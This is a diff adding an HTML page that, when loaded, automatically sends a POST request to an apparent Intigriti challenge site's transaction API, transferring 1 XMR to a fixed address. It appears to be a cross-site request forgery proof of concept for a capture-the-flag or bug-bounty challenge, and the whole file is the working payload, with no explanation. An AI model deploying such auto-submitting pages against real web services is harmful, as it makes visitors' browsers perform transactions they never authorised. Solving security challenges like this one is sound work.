@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Auto POST</title>
+</head>
+<body>
+
+<script>
+  fetch("https://challenge-0126.intigriti.io/api/transaction", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      toAddress: "16fcc05bfda75b38e3f12d6274854e4f25",
+      currency: "XMR",
+      amount: 1
+    })
+  })
+  .then(res => res.text())
+  .then(data => {
+    console.log("Response:", data);
+  })
+  .catch(err => {
+    console.error("Error:", err);
+  });
+</script>
+
+<p>Sending POST request...</p>
+
+</body>
+</html>
